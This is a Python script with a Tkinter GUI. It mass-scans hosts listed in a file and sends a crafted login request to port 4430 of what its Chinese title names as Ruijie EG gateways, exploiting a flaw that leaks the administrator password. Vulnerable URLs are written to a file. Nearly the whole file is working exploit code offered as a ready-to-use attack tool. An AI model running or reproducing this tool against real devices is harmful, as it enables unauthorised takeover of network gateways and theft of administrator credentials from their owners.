import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def ruijie_admin_passwd_leak_exp(url):
    newurl = "http://" + str(url) + ":4430/login.php"
    data = {'username': 'admin',
            'password': 'pass?show webmaster user'}
    try:
        res = requests.post(newurl,data=data, verify=False, timeout=3)
        if "data" in res.text and "Unrecognized host or address." not in res.text:
            ruijie_admin_passwd_leak_text.insert(END,"----------------------------------\n【！！！！！！】存在漏洞的url：" + newurl + "\n----------------------------------\n")
            ruijie_admin_passwd_leak_text.see(END)
            with open ("存在锐捷 EG易网关 login.php 管理员账号密码泄露漏洞的url.txt", 'a') as f:
                f.write(newurl + "\n")
        else:
            ruijie_admin_passwd_leak_text.insert(END,"【×】不存在漏洞的url：" + newurl + "\n")
            ruijie_admin_passwd_leak_text.see(END)
    except Exception as err:
        ruijie_admin_passwd_leak_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        ruijie_admin_passwd_leak_text.see(END)
def get_ruijie_admin_passwd_leak_addr():
    with open("host.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def ruijie_admin_passwd_leak_gui():
    ruijie_admin_passwd_leak = tk.Tk()
    ruijie_admin_passwd_leak.geometry("910x450")
    ruijie_admin_passwd_leak.title("锐捷 EG易网关 login.php 管理员账号密码泄露漏洞一把梭")
    ruijie_admin_passwd_leak.resizable(0, 0)
    ruijie_admin_passwd_leak.iconbitmap('logo.ico')
    global ruijie_admin_passwd_leak_text
    ruijie_admin_passwd_leak_text = scrolledtext.ScrolledText(ruijie_admin_passwd_leak,width=123, height=25)
    ruijie_admin_passwd_leak_text.grid(row=0, column=0, padx=10, pady=10)
    ruijie_admin_passwd_leak_text.see(END)
    addrs = get_ruijie_admin_passwd_leak_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(ruijie_admin_passwd_leak_exp, addr)
    ruijie_admin_passwd_leak.mainloop()